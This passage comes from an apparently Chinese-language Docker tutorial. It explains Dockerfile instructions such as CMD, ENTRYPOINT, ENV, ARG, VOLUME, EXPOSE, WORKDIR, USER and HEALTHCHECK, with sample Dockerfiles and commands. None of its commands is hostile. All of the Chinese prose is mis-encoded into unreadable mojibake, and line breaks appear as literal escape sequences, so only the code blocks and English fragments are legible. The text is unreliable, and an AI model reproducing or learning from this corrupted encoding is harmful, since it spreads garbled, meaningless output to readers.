$HOME\" ]\n```\n\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡çš„åŸå› ï¼Œå› ä¸ºè¿™äº›ç¯å¢ƒå˜é‡ä¼šè¢« shell è¿›è¡Œè§£æå¤„ç†ã€‚\n\n\n\næåˆ° `CMD` å°±ä¸å¾—ä¸æå®¹å™¨ä¸­åº”ç”¨åœ¨å‰å°æ‰§è¡Œå’Œåå°æ‰§è¡Œçš„é—®é¢˜ã€‚è¿™æ˜¯åˆå­¦è€…å¸¸å‡ºç°çš„ä¸€ä¸ªæ··æ·†ã€‚\n\nDocker ä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨ä¸­çš„åº”ç”¨éƒ½åº”è¯¥ä»¥å‰å°æ‰§è¡Œï¼Œè€Œä¸æ˜¯åƒè™šæ‹Ÿæœºã€ç‰©ç†æœºé‡Œé¢é‚£æ ·ï¼Œç”¨ upstart/systemd å»å¯åŠ¨åå°æœåŠ¡ï¼Œå®¹å™¨å†…æ²¡æœ‰åå°æœåŠ¡çš„æ¦‚å¿µã€‚\n\nä¸€äº›åˆå­¦è€…å°† `CMD` å†™ä¸ºï¼š\n\n```\nCMD service nginx start\n```\n\nç„¶åå‘ç°å®¹å™¨æ‰§è¡Œåå°±ç«‹å³é€€å‡ºäº†ã€‚ç”šè‡³åœ¨å®¹å™¨å†…å»ä½¿ç”¨ `systemctl` å‘½ä»¤ç»“æœå´å‘ç°æ ¹æœ¬æ‰§è¡Œä¸äº†ã€‚è¿™å°±æ˜¯å› ä¸ºæ²¡æœ‰ææ˜ç™½å‰å°ã€åå°çš„æ¦‚å¿µï¼Œæ²¡æœ‰åŒºåˆ†å®¹å™¨å’Œè™šæ‹Ÿæœºçš„å·®å¼‚ï¼Œä¾æ—§åœ¨ä»¥ä¼ ç»Ÿè™šæ‹Ÿæœºçš„è§’åº¦å»ç†è§£å®¹å™¨ã€‚   \n\nå¯¹äºå®¹å™¨è€Œè¨€ï¼Œå…¶å¯åŠ¨ç¨‹åºå°±æ˜¯å®¹å™¨åº”ç”¨è¿›ç¨‹ï¼Œå®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±å¤±å»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œä»è€Œé€€å‡ºï¼Œå…¶å®ƒè¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚\n\n \n\nè€Œä½¿ç”¨ `service nginx start` å‘½ä»¤ï¼Œåˆ™æ˜¯å¸Œæœ› upstart æ¥ä»¥åå°å®ˆæŠ¤è¿›ç¨‹å½¢å¼å¯åŠ¨ `nginx` æœåŠ¡ã€‚è€Œåˆšæ‰è¯´äº† `CMD service nginx start` ä¼šè¢«ç†è§£ä¸º `CMD [ \"sh\", \"-c\", \"service nginx start\"]`ï¼Œå› æ­¤ä¸»è¿›ç¨‹å®é™…ä¸Šæ˜¯ `sh`ã€‚é‚£ä¹ˆå½“ `service nginx start` å‘½ä»¤ç»“æŸåï¼Œ`sh` ä¹Ÿå°±ç»“æŸäº†ï¼Œ`sh` ä½œä¸ºä¸»è¿›ç¨‹é€€å‡ºäº†ï¼Œè‡ªç„¶å°±ä¼šä»¤å®¹å™¨é€€å‡ºã€‚\n\næ­£ç¡®çš„åšæ³•æ˜¯ç›´æ¥æ‰§è¡Œ `nginx` å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”è¦æ±‚ä»¥å‰å°å½¢å¼è¿è¡Œã€‚æ¯”å¦‚ï¼š\n\n```\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\n\n\n+ ENTRYPOINT å…¥å£ç‚¹\n\n`ENTRYPOINT` çš„ç›®çš„å’Œ `CMD` ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨æŒ‡å®šå®¹å™¨å¯åŠ¨ç¨‹åºåŠå‚æ•°ã€‚`ENTRYPOINT` åœ¨è¿è¡Œæ—¶ä¹Ÿå¯ä»¥æ›¿ä»£ï¼Œä¸è¿‡æ¯” `CMD` è¦ç•¥æ˜¾ç¹çï¼Œéœ€è¦é€šè¿‡ `docker run` çš„å‚æ•° `--entrypoint` æ¥æŒ‡å®šã€‚\n\n \n\nå½“æŒ‡å®šäº† `ENTRYPOINT` åï¼Œ`CMD` çš„å«ä¹‰å°±å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸å†æ˜¯ç›´æ¥çš„è¿è¡Œå…¶å‘½ä»¤ï¼Œè€Œæ˜¯å°† `CMD` çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ ç»™ `ENTRYPOINT` æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´å®é™…æ‰§è¡Œæ—¶ï¼Œå°†å˜ä¸ºï¼š\n\n```\n<ENTRYPOINT> \"<CMD>\"\n```\n\né‚£ä¹ˆæœ‰äº†Â `CMD`Â åï¼Œä¸ºä»€ä¹ˆè¿˜è¦æœ‰Â `ENTRYPOINT`Â å‘¢ï¼Ÿè¿™ç§Â `<ENTRYPOINT> \"<CMD>\"`Â æœ‰ä»€ä¹ˆå¥½å¤„ä¹ˆï¼Ÿè®©æˆ‘ä»¬æ¥çœ‹å‡ ä¸ªåœºæ™¯ã€‚\n\n\n\n+ åœºæ™¯ä¸€ï¼šè®©é•œåƒå˜æˆåƒå‘½ä»¤ä¸€æ ·ä½¿ç”¨\n\nå‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¾—çŸ¥è‡ªå·±å½“å‰å…¬ç½‘ IP çš„é•œåƒï¼Œé‚£ä¹ˆå¯ä»¥å…ˆç”¨ `CMD` æ¥å®ç°ï¼š\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nCMD [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\nå‡å¦‚æˆ‘ä»¬ä½¿ç”¨ `docker build -t myip .` æ¥æ„å»ºé•œåƒçš„è¯ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥è¯¢å½“å‰å…¬ç½‘ IPï¼Œåªéœ€è¦æ‰§è¡Œï¼š\n\n```\n$ docker run myip\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n```\n\nå—¯ï¼Œè¿™ä¹ˆçœ‹èµ·æ¥å¥½åƒå¯ä»¥ç›´æ¥æŠŠé•œåƒå½“åšå‘½ä»¤ä½¿ç”¨äº†ï¼Œä¸è¿‡å‘½ä»¤æ€»æœ‰å‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›åŠ å‚æ•°å‘¢ï¼Ÿæ¯”å¦‚ä»ä¸Šé¢çš„ `CMD` ä¸­å¯ä»¥çœ‹åˆ°å®è´¨çš„å‘½ä»¤æ˜¯ `curl`ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¸Œæœ›æ˜¾ç¤º HTTP å¤´ä¿¡æ¯ï¼Œå°±éœ€è¦åŠ ä¸Š `-i` å‚æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ  `-i` å‚æ•°ç»™ `docker run myip` ä¹ˆï¼Ÿ\n\n```\n$ docker run myip -i\ndocker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"exec: \\\\\\\"-i\\\\\\\": executable file not found in $PATH\\\"\\n\".\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯æ‰§è¡Œæ–‡ä»¶æ‰¾ä¸åˆ°çš„æŠ¥é”™ï¼Œ`executable file not found`ã€‚ä¹‹å‰æˆ‘ä»¬è¯´è¿‡ï¼Œè·Ÿåœ¨é•œåƒååé¢çš„æ˜¯ `command`ï¼Œè¿è¡Œæ—¶ä¼šæ›¿æ¢ `CMD` çš„é»˜è®¤å€¼ã€‚å› æ­¤è¿™é‡Œçš„ `-i` æ›¿æ¢äº†åŸæ¥çš„ `CMD`ï¼Œè€Œä¸æ˜¯æ·»åŠ åœ¨åŸæ¥çš„ `curl -s http://ip.cn` åé¢ã€‚è€Œ `-i` æ ¹æœ¬ä¸æ˜¯å‘½ä»¤ï¼Œæ‰€ä»¥è‡ªç„¶æ‰¾ä¸åˆ°ã€‚\n\n\n\nç°åœ¨æˆ‘ä»¬é‡æ–°ç”¨ `ENTRYPOINT` æ¥å®ç°è¿™ä¸ªé•œåƒï¼š\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nENTRYPOINT [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\nè¿™æ¬¡æˆ‘ä»¬å†æ¥å°è¯•ç›´æ¥ä½¿ç”¨ `docker run myip -i`ï¼š\n\n```\n$ docker run myip\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n\n$ docker run myip -i\nHTTP/1.1 200 OK\nServer: nginx/1.8.0\nDate: Tue, 22 Nov 2016 05:12:40 GMT\nContent-Type: text/html; charset=UTF-8\nVary: Accept-Encoding\nX-Powered-By: PHP/5.6.24-1~dotdeb+7.1\nX-Cache: MISS from cache-2\nX-Cache-Lookup: MISS from cache-2:80\nX-Cache: MISS from proxy-2_6\nTransfer-Encoding: chunked\nVia: 1.1 cache-2:80, 1.1 proxy-2_6:8006\nConnection: keep-alive\n\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æˆåŠŸäº†ã€‚è¿™æ˜¯å› ä¸ºå½“å­˜åœ¨Â `ENTRYPOINT`Â åï¼Œ`CMD`Â çš„å†…å®¹å°†ä¼šä½œä¸ºå‚æ•°ä¼ ç»™Â `ENTRYPOINT`ï¼Œè€Œè¿™é‡ŒÂ `-i`Â å°±æ˜¯æ–°çš„Â `CMD`ï¼Œå› æ­¤ä¼šä½œä¸ºå‚æ•°ä¼ ç»™Â `curl`ï¼Œä»è€Œè¾¾åˆ°äº†æˆ‘ä»¬é¢„æœŸçš„æ•ˆæœã€‚ \n\n  \n\n+ åœºæ™¯äºŒï¼šåº”ç”¨è¿è¡Œå‰çš„å‡†å¤‡å·¥ä½œ\n\n å¯åŠ¨å®¹å™¨å°±æ˜¯å¯åŠ¨ä¸»è¿›ç¨‹ï¼Œä½†æœ‰äº›æ—¶å€™ï¼Œå¯åŠ¨ä¸»è¿›ç¨‹å‰ï¼Œéœ€è¦ä¸€äº›å‡†å¤‡å·¥ä½œã€‚\n\næ¯”å¦‚ `mysql` ç±»çš„æ•°æ®åº“ï¼Œå¯èƒ½éœ€è¦ä¸€äº›æ•°æ®åº“é…ç½®ã€åˆå§‹åŒ–çš„å·¥ä½œï¼Œè¿™äº›å·¥ä½œè¦åœ¨æœ€ç»ˆçš„ mysql æœåŠ¡å™¨è¿è¡Œä¹‹å‰è§£å†³ã€‚\n\næ­¤å¤–ï¼Œå¯èƒ½å¸Œæœ›é¿å…ä½¿ç”¨ `root` ç”¨æˆ·å»å¯åŠ¨æœåŠ¡ï¼Œä»è€Œæé«˜å®‰å…¨æ€§ï¼Œè€Œåœ¨å¯åŠ¨æœåŠ¡å‰è¿˜éœ€è¦ä»¥ `root` èº«ä»½æ‰§è¡Œä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œæœ€ååˆ‡æ¢åˆ°æœåŠ¡ç”¨æˆ·èº«ä»½å¯åŠ¨æœåŠ¡ã€‚æˆ–è€…é™¤äº†æœåŠ¡å¤–ï¼Œå…¶å®ƒå‘½ä»¤ä¾æ—§å¯ä»¥ä½¿ç”¨ `root` èº«ä»½æ‰§è¡Œï¼Œæ–¹ä¾¿è°ƒè¯•ç­‰ã€‚\n\nè¿™äº›å‡†å¤‡å·¥ä½œæ˜¯å’Œå®¹å™¨Â `CMD`Â æ— å…³çš„ï¼Œæ— è®ºÂ `CMD`Â ä¸ºä»€ä¹ˆï¼Œéƒ½éœ€è¦äº‹å…ˆè¿›è¡Œä¸€ä¸ªé¢„å¤„ç†çš„å·¥ä½œã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åæ”¾å…¥Â `ENTRYPOINT`Â ä¸­å»æ‰§è¡Œï¼Œè€Œè¿™ä¸ªè„šæœ¬ä¼šå°†æ¥åˆ°çš„å‚æ•°ï¼ˆä¹Ÿå°±æ˜¯Â `<CMD>`ï¼‰ä½œä¸ºå‘½ä»¤ï¼Œåœ¨è„šæœ¬æœ€åæ‰§è¡Œã€‚æ¯”å¦‚å®˜æ–¹é•œåƒÂ `redis`Â ä¸­å°±æ˜¯è¿™ä¹ˆåšçš„ï¼š\n\n```\nFROM alpine:3.4\n...\nRUN addgroup -S redis && adduser -S -G redis redis\n...\nENTRYPOINT [\"docker-entrypoint.sh\"]\n\nEXPOSE 6379\nCMD [ \"redis-server\" ] \n```\n\n\n\n+ ENV è®¾ç½®ç¯å¢ƒå˜é‡\n\næ ¼å¼æœ‰ä¸¤ç§ï¼š\n\n- `ENV <key> <value>`\n\n- `ENV <key1>=<value1> <key2>=<value2>...`\n\n  \n\nè¿™ä¸ªæŒ‡ä»¤å¾ˆç®€å•ï¼Œå°±æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡è€Œå·²ï¼Œæ— è®ºæ˜¯åé¢çš„å…¶å®ƒæŒ‡ä»¤ï¼Œå¦‚Â `RUN`ï¼Œè¿˜æ˜¯è¿è¡Œæ—¶çš„åº”ç”¨ï¼Œéƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™é‡Œå®šä¹‰çš„ç¯å¢ƒå˜é‡ã€‚\n\n```\nENV NODE_VERSION 7.2.0\n\nRUN curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz\" \\\n  && curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\" \\\n\n```\n\n\n\nä¸‹åˆ—æŒ‡ä»¤å¯ä»¥æ”¯æŒç¯å¢ƒå˜é‡å±•å¼€ï¼šÂ `ADD`ã€`COPY`ã€`ENV`ã€`EXPOSE`ã€`LABEL`ã€`USER`ã€`WORKDIR`ã€`VOLUME`ã€`STOPSIGNAL`ã€`ONBUILD`ã€‚\n\n\n\n+ ARG æ„å»ºå‚æ•°(æ„å»ºç¯å¢ƒçš„ç¯å¢ƒå˜é‡)\n\næ ¼å¼ï¼š`ARG <å‚æ•°å>[=<é»˜è®¤å€¼>]`\n\næ„å»ºå‚æ•°å’Œ `ENV` çš„æ•ˆæœä¸€æ ·ï¼Œéƒ½æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ã€‚æ‰€ä¸åŒçš„æ˜¯ï¼Œ`ARG` æ‰€è®¾ç½®çš„æ„å»ºç¯å¢ƒçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨å°†æ¥å®¹å™¨è¿è¡Œæ—¶æ˜¯ä¸ä¼šå­˜åœ¨è¿™äº›ç¯å¢ƒå˜é‡çš„ã€‚ä½†æ˜¯ä¸è¦å› æ­¤å°±ä½¿ç”¨ `ARG` ä¿å­˜å¯†ç ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸º `docker history` è¿˜æ˜¯å¯ä»¥çœ‹åˆ°æ‰€æœ‰å€¼çš„ã€‚\n\n`Dockerfile`Â ä¸­çš„Â `ARG`Â æŒ‡ä»¤æ˜¯å®šä¹‰å‚æ•°åç§°ï¼Œä»¥åŠå®šä¹‰å…¶é»˜è®¤å€¼ã€‚è¯¥é»˜è®¤å€¼å¯ä»¥åœ¨æ„å»ºå‘½ä»¤Â `docker build`Â ä¸­ç”¨Â `--build-arg <å‚æ•°å>=<å€¼>`Â æ¥è¦†ç›–ã€‚\n\n\n\n+ VOLUME å®šä¹‰åŒ¿åå·\n\næ ¼å¼ä¸ºï¼š\n\n- `VOLUME [\"<è·¯å¾„1>\", \"<è·¯å¾„2>\"...]`\n- `VOLUME <è·¯å¾„>`\n\nä¸ºäº†é˜²æ­¢è¿è¡Œæ—¶ç”¨æˆ·å¿˜è®°å°†åŠ¨æ€æ–‡ä»¶æ‰€ä¿å­˜ç›®å½•æŒ‚è½½ä¸ºå·ï¼Œåœ¨ `Dockerfile` ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº‹å…ˆæŒ‡å®šæŸäº›ç›®å½•æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œè¿™æ ·åœ¨è¿è¡Œæ—¶å¦‚æœç”¨æˆ·ä¸æŒ‡å®šæŒ‚è½½ï¼Œå…¶åº”ç”¨ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä¸ä¼šå‘å®¹å™¨å­˜å‚¨å±‚å†™å…¥å¤§é‡æ•°æ®ã€‚\n\n```\nVOLUME /data\n```\n\n\n\nè¿™é‡Œçš„ `/data` ç›®å½•å°±ä¼šåœ¨è¿è¡Œæ—¶è‡ªåŠ¨æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œä»»ä½•å‘ `/data` ä¸­å†™å…¥çš„ä¿¡æ¯éƒ½ä¸ä¼šè®°å½•è¿›å®¹å™¨å­˜å‚¨å±‚ï¼Œä»è€Œä¿è¯äº†å®¹å™¨å­˜å‚¨å±‚çš„æ— çŠ¶æ€åŒ–ã€‚å½“ç„¶ï¼Œè¿è¡Œæ—¶å¯ä»¥è¦†ç›–è¿™ä¸ªæŒ‚è½½è®¾ç½®ã€‚æ¯”å¦‚ï¼š\n\n```\ndocker run -d -v mydata:/data xxxx\n```\n\n åœ¨è¿™è¡Œå‘½ä»¤ä¸­ï¼Œå°±ä½¿ç”¨äº†Â `mydata`Â è¿™ä¸ªå‘½åå·æŒ‚è½½åˆ°äº†Â `/data`Â è¿™ä¸ªä½ç½®ï¼Œæ›¿ä»£äº†Â `Dockerfile`Â ä¸­å®šä¹‰çš„åŒ¿åå·çš„æŒ‚è½½é…ç½®ã€‚ \n\n\n\n+ EXPOSE å£°æ˜ç«¯å£\n\næ ¼å¼ä¸ºÂ `EXPOSE <ç«¯å£1> [<ç«¯å£2>...]`ã€‚\n\n`EXPOSE`Â æŒ‡ä»¤æ˜¯å£°æ˜è¿è¡Œæ—¶å®¹å™¨æä¾›æœåŠ¡ç«¯å£ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå£°æ˜ï¼Œåœ¨è¿è¡Œæ—¶å¹¶ä¸ä¼šå› ä¸ºè¿™ä¸ªå£°æ˜åº”ç”¨å°±ä¼šå¼€å¯è¿™ä¸ªç«¯å£çš„æœåŠ¡ã€‚åœ¨ Dockerfile ä¸­å†™å…¥è¿™æ ·çš„å£°æ˜æœ‰ä¸¤ä¸ªå¥½å¤„ï¼Œä¸€ä¸ªæ˜¯å¸®åŠ©é•œåƒä½¿ç”¨è€…ç†è§£è¿™ä¸ªé•œåƒæœåŠ¡çš„å®ˆæŠ¤ç«¯å£ï¼Œä»¥æ–¹ä¾¿é…ç½®æ˜ å°„ï¼›å¦ä¸€ä¸ªç”¨å¤„åˆ™æ˜¯åœ¨è¿è¡Œæ—¶ä½¿ç”¨éšæœºç«¯å£æ˜ å°„æ—¶ï¼Œä¹Ÿå°±æ˜¯Â `docker run -P`æ—¶ï¼Œä¼šè‡ªåŠ¨éšæœºæ˜ å°„Â `EXPOSE`Â çš„ç«¯å£ã€‚\n\n\n\nè¦å°†Â `EXPOSE`Â å’Œåœ¨è¿è¡Œæ—¶ä½¿ç”¨Â `-p <å®¿ä¸»ç«¯å£>:<å®¹å™¨ç«¯å£>`Â åŒºåˆ†å¼€æ¥ã€‚`-p`ï¼Œæ˜¯æ˜ å°„å®¿ä¸»ç«¯å£å’Œå®¹å™¨ç«¯å£ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯å°†å®¹å™¨çš„å¯¹åº”ç«¯å£æœåŠ¡å…¬å¼€ç»™å¤–ç•Œè®¿é—®ï¼Œè€ŒÂ `EXPOSE`Â ä»…ä»…æ˜¯å£°æ˜å®¹å™¨æ‰“ç®—ä½¿ç”¨ä»€ä¹ˆç«¯å£è€Œå·²ï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨åœ¨å®¿ä¸»è¿›è¡Œç«¯å£æ˜ å°„ã€‚\n\n\n\n+ WORKDIR æŒ‡å®šå·¥ä½œç›®å½•\n\næ ¼å¼ä¸º `WORKDIR <å·¥ä½œç›®å½•è·¯å¾„>`ã€‚\n\nä½¿ç”¨Â `WORKDIR`Â æŒ‡ä»¤å¯ä»¥æ¥æŒ‡å®šå·¥ä½œç›®å½•ï¼ˆæˆ–è€…ç§°ä¸ºå½“å‰ç›®å½•ï¼‰ï¼Œä»¥åå„å±‚çš„å½“å‰ç›®å½•å°±è¢«æ”¹ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œå¦‚è¯¥ç›®å½•ä¸å­˜åœ¨ï¼Œ`WORKDIR`Â ä¼šå¸®ä½ å»ºç«‹ç›®å½•ã€‚\n\n\n\nä¹‹å‰æåˆ°ä¸€äº›åˆå­¦è€…å¸¸çŠ¯çš„é”™è¯¯æ˜¯æŠŠ `Dockerfile` ç­‰åŒäº Shell è„šæœ¬æ¥ä¹¦å†™ï¼Œè¿™ç§é”™è¯¯çš„ç†è§£è¿˜å¯èƒ½ä¼šå¯¼è‡´å‡ºç°ä¸‹é¢è¿™æ ·çš„é”™è¯¯ï¼š\n\n```\nRUN cd /app\nRUN echo \"hello\" > world.txt\n```\n\nå¦‚æœå°†è¿™ä¸ª `Dockerfile` è¿›è¡Œæ„å»ºé•œåƒè¿è¡Œåï¼Œä¼šå‘ç°æ‰¾ä¸åˆ° `/app/world.txt` æ–‡ä»¶ï¼Œæˆ–è€…å…¶å†…å®¹ä¸æ˜¯ `hello`ã€‚åŸå› å…¶å®å¾ˆç®€å•ï¼Œåœ¨ Shell ä¸­ï¼Œè¿ç»­ä¸¤è¡Œæ˜¯åŒä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œç¯å¢ƒï¼Œå› æ­¤å‰ä¸€ä¸ªå‘½ä»¤ä¿®æ”¹çš„å†…å­˜çŠ¶æ€ï¼Œä¼šç›´æ¥å½±å“åä¸€ä¸ªå‘½ä»¤ï¼›è€Œåœ¨ `Dockerfile` ä¸­ï¼Œ **è¿™ä¸¤è¡Œ `RUN` å‘½ä»¤çš„æ‰§è¡Œç¯å¢ƒæ ¹æœ¬ä¸åŒï¼Œæ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å®¹å™¨ã€‚**è¿™å°±æ˜¯å¯¹ `Dockerfile` æ„å»ºåˆ†å±‚å­˜å‚¨çš„æ¦‚å¿µä¸äº†è§£æ‰€å¯¼è‡´çš„é”™è¯¯ã€‚\n\n\n\nä¹‹å‰è¯´è¿‡æ¯ä¸€ä¸ª `RUN` éƒ½æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨ã€æ‰§è¡Œå‘½ä»¤ã€ç„¶åæäº¤å­˜å‚¨å±‚æ–‡ä»¶å˜æ›´ã€‚ç¬¬ä¸€å±‚ `RUN cd /app` çš„æ‰§è¡Œä»…ä»…æ˜¯å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•å˜æ›´ï¼Œä¸€ä¸ªå†…å­˜ä¸Šçš„å˜åŒ–è€Œå·²ï¼Œå…¶ç»“æœä¸ä¼šé€ æˆä»»ä½•æ–‡ä»¶å˜æ›´ã€‚è€Œåˆ°ç¬¬äºŒå±‚çš„æ—¶å€™ï¼Œå¯åŠ¨çš„æ˜¯ä¸€ä¸ªå…¨æ–°çš„å®¹å™¨ï¼Œè·Ÿç¬¬ä¸€å±‚çš„å®¹å™¨æ›´å®Œå…¨æ²¡å…³ç³»ï¼Œè‡ªç„¶ä¸å¯èƒ½ç»§æ‰¿å‰ä¸€å±‚æ„å»ºè¿‡ç¨‹ä¸­çš„å†…å­˜å˜åŒ–ã€‚\n\nå› æ­¤å¦‚æœéœ€è¦æ”¹å˜ä»¥åå„å±‚çš„å·¥ä½œç›®å½•çš„ä½ç½®ï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨ `WORKDIR` æŒ‡ä»¤ã€‚\n\n \n\n+ USER æŒ‡å®šå½“å‰ç”¨æˆ·\n\næ ¼å¼ï¼š`USER <ç”¨æˆ·å>`\n\n`USER` æŒ‡ä»¤å’Œ `WORKDIR` ç›¸ä¼¼ï¼Œéƒ½æ˜¯æ”¹å˜ç¯å¢ƒçŠ¶æ€å¹¶å½±å“ä»¥åçš„å±‚ã€‚`WORKDIR` æ˜¯æ”¹å˜å·¥ä½œç›®å½•ï¼Œ`USER`åˆ™æ˜¯æ”¹å˜ä¹‹åå±‚çš„æ‰§è¡Œ `RUN`, `CMD` ä»¥åŠ `ENTRYPOINT` è¿™ç±»å‘½ä»¤çš„èº«ä»½ã€‚\n\n\n\nå½“ç„¶ï¼Œå’Œ `WORKDIR` ä¸€æ ·ï¼Œ`USER` åªæ˜¯å¸®åŠ©ä½ åˆ‡æ¢åˆ°æŒ‡å®šç”¨æˆ·è€Œå·²ï¼Œè¿™ä¸ªç”¨æˆ·å¿…é¡»æ˜¯äº‹å…ˆå»ºç«‹å¥½çš„ï¼Œå¦åˆ™æ— æ³•åˆ‡æ¢ã€‚\n\n```\nRUN groupadd -r redis && useradd -r -g redis redis\nUSER redis\nRUN [ \"redis-server\" ]\n```\n\n \n\nå¦‚æœä»¥ `root` æ‰§è¡Œçš„è„šæœ¬ï¼Œåœ¨æ‰§è¡ŒæœŸé—´å¸Œæœ›æ”¹å˜èº«ä»½ï¼Œæ¯”å¦‚å¸Œæœ›ä»¥æŸä¸ªå·²ç»å»ºç«‹å¥½çš„ç”¨æˆ·æ¥è¿è¡ŒæŸä¸ªæœåŠ¡è¿›ç¨‹ï¼Œä¸è¦ä½¿ç”¨ `su` æˆ–è€… `sudo`ï¼Œè¿™äº›éƒ½éœ€è¦æ¯”è¾ƒéº»çƒ¦çš„é…ç½®ï¼Œè€Œä¸”åœ¨ TTY ç¼ºå¤±çš„ç¯å¢ƒä¸‹ç»å¸¸å‡ºé”™ã€‚å»ºè®®ä½¿ç”¨ [`gosu`](https://github.com/tianon/gosu)ã€‚\n\n```\n# å»ºç«‹ redis ç”¨æˆ·ï¼Œå¹¶ä½¿ç”¨ gosu æ¢å¦ä¸€ä¸ªç”¨æˆ·æ‰§è¡Œå‘½ä»¤\nRUN groupadd -r redis && useradd -r -g redis redis\n# ä¸‹è½½ gosu\nRUN wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64\" \\\n    && chmod +x /usr/local/bin/gosu \\\n    && gosu nobody true\n# è®¾ç½® CMDï¼Œå¹¶ä»¥å¦å¤–çš„ç”¨æˆ·æ‰§è¡Œ\nCMD [ \"exec\", \"gosu\", \"redis\", \"redis-server\" ]\n```\n\n\n\n+ HEALTHCHECK å¥åº·æ£€æŸ¥\n\næ ¼å¼ï¼š\n\n- `HEALTHCHECK [é€‰é¡¹] CMD <å‘½ä»¤>`ï¼šè®¾ç½®æ£€æŸ¥å®¹å™¨å¥åº·çŠ¶å†µçš„å‘½ä»¤\n- `HEALTHCHECK NONE`ï¼šå¦‚æœåŸºç¡€é•œåƒæœ‰å¥åº·æ£€æŸ¥æŒ‡ä»¤ï¼Œä½¿ç”¨è¿™è¡Œå¯ä»¥å±è”½æ‰å…¶å¥åº·æ£€æŸ¥æŒ‡ä»¤\n\nè€Œè‡ª 1.12 ä¹‹åï¼ŒDocker æä¾›äº† `HEALTHCHECK` æŒ‡ä»¤ï¼Œé€šè¿‡è¯¥æŒ‡ä»¤æŒ‡å®šä¸€è¡Œå‘½ä»¤ï¼Œç”¨è¿™è¡Œå‘½ä»¤æ¥åˆ¤æ–­å®¹å™¨ä¸»è¿›ç¨‹çš„æœåŠ¡çŠ¶æ€æ˜¯å¦è¿˜æ­£å¸¸ï¼Œä»è€Œæ¯”è¾ƒçœŸå®çš„ååº”å®¹å™¨å®é™…çŠ¶æ€ã€‚\n\n å½“åœ¨ä¸€ä¸ªé•œåƒæŒ‡å®šäº† `HEALTHCHECK` æŒ‡ä»¤åï¼Œç”¨å…¶å¯åŠ¨å®¹å™¨ï¼Œåˆå§‹çŠ¶æ€ä¼šä¸º `starting`ï¼Œåœ¨ `HEALTHCHECK` æŒ‡ä»¤æ£€æŸ¥æˆåŠŸåå˜ä¸º `healthy`ï¼Œå¦‚æœè¿ç»­ä¸€å®šæ¬¡æ•°å¤±è´¥ï¼Œåˆ™ä¼šå˜ä¸º `unhealthy`ã€‚\n\n \n\n`HEALTHCHECK` æ”¯æŒä¸‹åˆ—é€‰é¡¹ï¼š\n\n- `--interval=<é—´éš”>`ï¼šä¸¤æ¬¡å¥åº·æ£€æŸ¥çš„é—´éš”ï¼Œé»˜è®¤ä¸º 30 ç§’ï¼›\n- `--timeout=<æ—¶é•¿>`ï¼šå¥åº·æ£€æŸ¥å‘½ä»¤è¿è¡Œè¶…æ—¶æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œæœ¬æ¬¡å¥åº·æ£€æŸ¥å°±è¢«è§†ä¸ºå¤±è´¥ï¼Œé»˜è®¤ 30 ç§’ï¼›\n- 